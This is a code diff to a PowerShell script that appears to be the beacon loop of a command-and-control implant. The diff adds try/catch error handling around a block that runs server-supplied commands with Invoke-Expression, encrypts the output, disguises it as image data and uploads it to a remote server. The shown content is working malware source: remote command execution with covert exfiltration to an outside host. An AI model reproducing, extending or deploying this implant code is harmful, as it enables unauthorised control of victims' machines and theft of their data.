@@ -1557,14 +1557,17 @@ while($true)
                 (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
 
             } else {
-
-                $Output = Invoke-Expression $ReadCommandClear | out-string  
-                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
-                $StdError = ($error[0] | Out-String)
-                if ($StdError){
-                $Output = $Output + $StdError
-                $error.clear()
-            }
+                try {
+                    $Output = Invoke-Expression $ReadCommandClear | out-string  
+                    $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                    $StdError = ($error[0] | Out-String)
+                    if ($StdError){
+                    $Output = $Output + $StdError
+                    $error.clear()
+                    }
+                } catch {
+                    $Output = "Error: " + $error[0]
+                }
 
             $Output = Encrypt-String2 $key $Output
             $UploadBytes = getimgdata $Output
@@ -1789,14 +1792,17 @@ while($true)
                 (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
 
             } else {
-
-                $Output = Invoke-Expression $ReadCommandClear | out-string  
-                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
-                $StdError = ($error[0] | Out-String)
-                if ($StdError){
-                $Output = $Output + $StdError
-                $error.clear()
-            }
+                try {
+                    $Output = Invoke-Expression $ReadCommandClear | out-string  
+                    $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                    $StdError = ($error[0] | Out-String)
+                    if ($StdError){
+                    $Output = $Output + $StdError
+                    $error.clear()
+                    }
+                } catch {
+                    $Output = "Error: " + $error[0]
+                }
 
             $Output = Encrypt-String2 $key $Output
             $UploadBytes = getimgdata $Output
